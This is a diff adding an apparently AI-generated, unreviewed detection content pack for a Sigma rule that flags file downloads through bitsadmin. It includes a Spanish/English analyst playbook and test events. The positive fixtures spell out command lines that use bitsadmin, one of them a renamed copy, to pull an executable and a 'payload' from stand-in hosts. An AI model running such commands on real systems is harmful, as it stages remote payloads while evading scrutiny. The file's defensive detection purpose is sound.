@@ -1,0 +1,139 @@
+{
+  "rule": {
+    "id": "d059842b-6b9d-4ed1-b5c3-5b89143c6ede",
+    "title": "File Download Via Bitsadmin",
+    "level": "medium",
+    "status": "test",
+    "author": "Michael Haag, FPT.EagleEye",
+    "path": "windows/process_creation/proc_creation_win_bitsadmin_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1036.003",
+      "T1105",
+      "T1197"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó bitsadmin.exe (o una copia renombrada) con parámetros para descargar un archivo mediante BITS. Puede indicar transferencia de herramientas o payloads usando un binario legítimo de Windows.",
+      "what_it_detects": "Creación de procesos donde Image termina en \\bitsadmin.exe u OriginalFileName es bitsadmin.exe, y CommandLine contiene ' /transfer ', o bien ' /create ' o ' /addfile ' junto con 'http'.",
+      "why_it_matters": "BITSAdmin es un binario LOLBAS que permite descargar archivos (T1105) y crear jobs BITS persistentes (T1197). Un OriginalFileName sin coincidencia en Image sugiere un binario renombrado (T1036.003).",
+      "triage_steps": [
+        "Revise CommandLine: extraiga la URL, el dominio o la IP remota, el nombre del job y la ruta local de destino del archivo.",
+        "Compare Image con OriginalFileName; si bitsadmin.exe se ejecutó desde otra ruta o con otro nombre, trátelo como sospecha de enmascaramiento.",
+        "Analice ParentImage y la línea de comandos del padre: cmd.exe, powershell.exe, wscript.exe u Office son más sospechosos que un instalador conocido.",
+        "Verifique el usuario y si la cuenta normalmente administra el equipo o ejecuta tareas de actualización.",
+        "Busque el archivo descargado en el disco, obtenga su hash y consulte su reputación; revise si luego se ejecutó como proceso hijo.",
+        "Pivotee en el mismo host +/- 15 minutos: conexiones de red al dominio o IP, procesos nuevos, tareas programadas y cambios en el registro.",
+        "Liste jobs BITS activos (bitsadmin /list /allusers /verbose o Get-BitsTransfer) para detectar /SetNotifyCmdLine u otros jobs persistentes.",
+        "Busque la misma URL o hash en otros endpoints y alertas previas de este host o usuario."
+      ],
+      "false_positives": [
+        "Aplicaciones legítimas o instaladores que aún usan bitsadmin para descargar actualizaciones, aunque es poco común.",
+        "Scripts de administración o despliegue de software del equipo de TI que descargan desde servidores internos conocidos.",
+        "Pruebas autorizadas de red team o Atomic Red Team (T1105)."
+      ],
+      "response_steps": [
+        "Confirme con el dueño del equipo o TI si la descarga era esperada; valide la URL y el hash del archivo.",
+        "Si es malicioso, aísle el endpoint y bloquee el dominio, la IP y el hash en proxy, firewall y EDR.",
+        "Cancele los jobs BITS maliciosos (bitsadmin /cancel o Remove-BitsTransfer) y ponga en cuarentena el archivo descargado tras preservar evidencia.",
+        "Investigue la ejecución del payload y mecanismos de persistencia; restablezca credenciales del usuario si hay indicios de compromiso.",
+        "Busque la misma actividad en toda la flota y documente los IOC en el caso."
+      ],
+      "severity_rationale": "Nivel medio: la descarga con bitsadmin es un indicador fuerte de abuso de LOLBAS, pero aún existen usos legítimos limitados que requieren verificación."
+    },
+    "en": {
+      "summary": "bitsadmin.exe (or a renamed copy) was run with arguments that download a file over BITS. This can mean tool or payload transfer using a trusted Windows binary.",
+      "what_it_detects": "Process creation where Image ends with \\bitsadmin.exe or OriginalFileName is bitsadmin.exe, and CommandLine contains ' /transfer ', or ' /create ' or ' /addfile ' together with 'http'.",
+      "why_it_matters": "BITSAdmin is a LOLBAS binary that can download files (T1105) and create persistent BITS jobs (T1197). An OriginalFileName match without a matching Image suggests a renamed binary (T1036.003).",
+      "triage_steps": [
+        "Read CommandLine: extract the remote URL, domain or IP, the job name and the local destination path.",
+        "Compare Image with OriginalFileName; bitsadmin.exe running from an unusual path or under another name points to masquerading.",
+        "Check ParentImage and its command line: cmd.exe, powershell.exe, wscript.exe or Office apps are more suspicious than a known installer.",
+        "Check the user and whether that account normally administers the host or runs update tasks.",
+        "Locate the downloaded file, hash it and check reputation; see whether it was later executed as a child process.",
+        "Pivot on the same host within +/- 15 minutes: network connections to the domain or IP, new processes, scheduled tasks, registry changes.",
+        "List active BITS jobs (bitsadmin /list /allusers /verbose or Get-BitsTransfer) to spot /SetNotifyCmdLine or other persistent jobs.",
+        "Search the same URL or hash across other endpoints and earlier alerts for this host or user."
+      ],
+      "false_positives": [
+        "Legitimate applications or installers that still use bitsadmin to fetch updates, though this is uncommon.",
+        "IT administration or software deployment scripts downloading from known internal servers.",
+        "Authorized red team or Atomic Red Team testing (T1105)."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or IT whether the download was expected; validate the URL and file hash.",
+        "If malicious, isolate the endpoint and block the domain, IP and hash in proxy, firewall and EDR.",
+        "Cancel malicious BITS jobs (bitsadmin /cancel or Remove-BitsTransfer) and quarantine the downloaded file after preserving evidence.",
+        "Investigate payload execution and persistence; reset the user's credentials if compromise is indicated.",
+        "Hunt for the same activity fleet-wide and record IOCs in the case."
+      ],
+      "severity_rationale": "Medium: downloading with bitsadmin is a strong LOLBAS abuse signal, but limited legitimate use still exists and needs verification."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "bitsadmin /transfer downloading an executable to a public folder, launched from cmd.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin.exe /transfer updjob /download /priority high http://203.0.113.25/files/upd.exe C:\\Users\\Public\\upd.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat",
+          "CurrentDirectory": "C:\\Users\\jperez\\"
+        }
+      },
+      {
+        "description": "Renamed bitsadmin (matched by OriginalFileName) adding an HTTP file to a BITS job",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\ProgramData\\svc\\svchelper.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "svchelper.exe /addfile syncjob https://downloads.example.org/payload.dat C:\\ProgramData\\svc\\payload.dat",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\ProgramData\\svc\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Administrator listing BITS jobs; no /transfer, /create or /addfile",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\admin.soporte",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin.exe /list /allusers /verbose",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "bitsadmin /create without any http URL in the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FILE01.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin.exe /create backupjob",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
